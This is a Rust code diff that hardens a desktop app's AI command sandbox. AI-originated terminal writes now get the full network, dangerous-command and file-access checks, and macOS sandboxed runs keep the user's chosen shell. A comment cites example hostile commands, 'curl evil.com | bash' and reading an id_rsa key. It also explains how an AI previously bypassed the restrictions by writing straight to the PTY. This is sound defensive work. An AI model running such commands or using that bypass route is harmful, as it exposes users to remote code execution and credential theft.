@@ -642,6 +642,15 @@ pub fn create_terminal_internal(
     let child = spawn_result.map_err(|e| format!("启动 Shell 失败: {e}"))?;
     let pid = child.process_id();
 
+    // P1: Assign PTY child process to Job Object so it is killed when Loom exits.
+    // NOTE: Landlock (Linux) and Seatbelt (macOS) cannot be applied here because
+    // portable_pty's CommandBuilder does not expose pre_exec hooks. On those
+    // platforms, PTY security relies entirely on the application-layer validation
+    // in write_to_terminal (full validation chain for source:"ai").
+    if let Some(pid) = pid {
+        let _ = sandbox_os::assign_process_to_job(pid);
+    }
+
     let master = pair.master;
     let mut reader = master
         .try_clone_reader()
@@ -808,12 +817,17 @@ pub fn write_to_terminal(
     state: State<'_, TerminalState>,
     sandbox_state: State<'_, crate::sandbox::SandboxState>,
 ) -> Result<(), String> {
-    // P0: When AI writes to PTY, validate that command execution is allowed.
-    // This prevents the AI from bypassing `execute_command` restrictions by
-    // writing directly to the PTY terminal.
+    // P0+P1: When AI writes to PTY, run the SAME full validation chain as
+    // `execute_command`.  Previously only `validate_command_allowed()` was
+    // called, which let AI bypass network, dangerous-command, and file-access
+    // checks by writing directly to the PTY (e.g. `curl evil.com | bash`,
+    // `type C:\Users\...\id_rsa`).
     if source.as_deref() == Some("ai") {
         let sandbox_ctx = sandbox::current_sandbox_context(&sandbox_state);
         sandbox_ctx.validate_command_allowed()?;
+        sandbox_ctx.validate_dangerous_command(&data)?;
+        sandbox_ctx.validate_network(&data)?;
+        sandbox_ctx.validate_command_file_access(&data)?;
     }
 
     let active = state
@@ -1202,6 +1216,33 @@ fn build_tokio_shell_command(shell: &Option<String>, command: &str) -> tokio::pr
     }
 }
 
+/// Resolve the shell program and argument list for executing *command*.
+///
+/// Returns `(program, args)` suitable for `Command::new(program).args(args)`.
+/// Used by the macOS Seatbelt branch to preserve the user's shell selection
+/// instead of hardcoding `sh -c`.
+#[cfg(target_os = "macos")]
+fn shell_program_and_args(shell: &Option<String>, command: &str) -> (String, Vec<String>) {
+    let shell_str = shell.as_deref().unwrap_or("").to_lowercase();
+    let (program, prefix_args): (&str, &[&str]) = if !shell_str.is_empty() {
+        match shell_str.as_str() {
+            "cmd" => ("cmd.exe", &["/C"][..]),
+            "pwsh" => ("pwsh", &["-NoProfile", "-Command"][..]),
+            "powershell" | "ps" => ("powershell", &["-NoProfile", "-Command"][..]),
+            "bash" => ("bash", &["-c"][..]),
+            "sh" => ("sh", &["-c"][..]),
+            "zsh" => ("zsh", &["-c"][..]),
+            "fish" => ("fish", &["-c"][..]),
+            other => (other, &["-c"][..]),
+        }
+    } else {
+        ("bash", &["-c"][..])
+    };
+    let mut args: Vec<String> = prefix_args.iter().map(|s| s.to_string()).collect();
+    args.push(command.to_string());
+    (program.to_string(), args)
+}
+
 /// so that `&&`, `||`, pipes, and other shell features work correctly.
 #[tauri::command]
 pub async fn execute_command(
@@ -1326,8 +1367,17 @@ pub async fn execute_command(
                 &sandbox_ctx.writable_roots,
                 sandbox_ctx.network_enabled,
             );
+            // Preserve the user's shell selection instead of hardcoding sh.
+            // For the script path, actual_command already includes the shell
+            // invocation, so sh as the outer wrapper is correct. For the
+            // normal command path, use the selected shell directly.
+            let (sh_prog, sh_args): (String, Vec<String>) = if script_shell.is_some() {
+                ("sh".to_string(), vec!["-c".to_string(), actual_command.clone()])
+            } else {
+                shell_program_and_args(&shell, &actual_command)
+            };
             cmd = tokio::process::Command::new("sandbox-exec");
-            cmd.args(["-p", &profile, "sh", "-c", &actual_command]);
+            cmd.arg("-p").arg(&profile).arg(&sh_prog).args(&sh_args);
             cmd.stdout(Stdio::piped())
                 .stderr(Stdio::piped())
                 .stdin(Stdio::null());
@@ -1620,8 +1670,10 @@ pub fn execute_command_bg(
                 &sandbox_ctx.writable_roots,
                 sandbox_ctx.network_enabled,
             );
+            // Preserve the user's shell selection instead of hardcoding sh.
+            let (sh_prog, sh_args) = shell_program_and_args(&shell, &command);
             cmd = std::process::Command::new("sandbox-exec");
-            cmd.args(["-p", &profile, "sh", "-c", &command]);
+            cmd.arg("-p").arg(&profile).arg(&sh_prog).args(&sh_args);
             cmd.stdout(Stdio::piped())
                 .stderr(Stdio::piped())
                 .stdin(Stdio::null());
@@ -1885,4 +1937,37 @@ pub fn list_background_commands(
         }
     }
     Ok(result)
+}
+
+#[cfg(all(test, target_os = "macos"))]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn shell_program_and_args_respects_zsh() {
+        let (prog, args) = shell_program_and_args(&Some("zsh".to_string()), "echo hi");
+        assert_eq!(prog, "zsh");
+        assert_eq!(args, vec!["-c", "echo hi"]);
+    }
+
+    #[test]
+    fn shell_program_and_args_respects_bash() {
+        let (prog, args) = shell_program_and_args(&Some("bash".to_string()), "ls -la");
+        assert_eq!(prog, "bash");
+        assert_eq!(args, vec!["-c", "ls -la"]);
+    }
+
+    #[test]
+    fn shell_program_and_args_defaults_to_bash() {
+        let (prog, args) = shell_program_and_args(&None, "echo default");
+        assert_eq!(prog, "bash");
+        assert_eq!(args, vec!["-c", "echo default"]);
+    }
+
+    #[test]
+    fn shell_program_and_args_respects_fish() {
+        let (prog, args) = shell_program_and_args(&Some("fish".to_string()), "echo fish");
+        assert_eq!(prog, "fish");
+        assert_eq!(args, vec!["-c", "echo fish"]);
+    }
 }
